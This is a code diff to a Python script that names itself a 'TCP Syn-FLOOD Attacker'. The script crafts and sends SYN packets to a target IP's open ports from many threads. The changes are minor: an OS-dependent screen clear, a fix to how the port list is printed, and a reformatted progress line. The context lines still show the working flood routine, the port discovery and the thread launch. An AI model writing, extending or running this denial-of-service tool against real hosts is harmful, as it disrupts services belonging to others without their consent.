@@ -24,6 +24,7 @@ import sys
 import random
 import argparse
 import socket
+import platform
 global pcount
 pcount=0
 class thread(threading.Thread):
@@ -100,7 +101,7 @@ def SYN_FLOOD(tarIP,tarPorts):
             TCP_Packet.window = w_indow
             send(IP_Packet/TCP_Packet, verbose=0)
             pcount+=1
-            print(f'Total packets sent -> {pcount} \t Sent from {IP_Packet.src}:{TCP_Packet.sport} to \t\t {IP_Packet.dst}:{dstPort}        \r',end='')    
+            print(f'Total packets sent -> {pcount}         Sent from {IP_Packet.src}:{TCP_Packet.sport} to             {IP_Packet.dst}:{dstPort}        \r',end='')    
 
 def main():
     parser = argparse.ArgumentParser(description = "TCP Syn-FLOOD Attacker")        
@@ -118,7 +119,7 @@ def main():
     if not ports:
         print('Looking for open ports..')
         ports = find_open_ports(tarIP)
-        print("Open Ports found : ",' '.join(ports))
+        print("Open Ports found : ",' '.join(str(p) for p in ports))
     if ports==[]:
         exit(print('No Open Ports Found!!'))
     
@@ -130,7 +131,13 @@ def main():
         threads[i].start()
 
 if __name__=="__main__":
-    os.system('clear') 
+    if platform.system()=='Linux':
+        os.system('clear')
+    elif platform.system()=='Windows':
+        os.system('cls')    
+    else:
+        os.system('cls')
+
     if(randInt()<7000):
         print('''
         ,----,                                                                                                                                                                                  
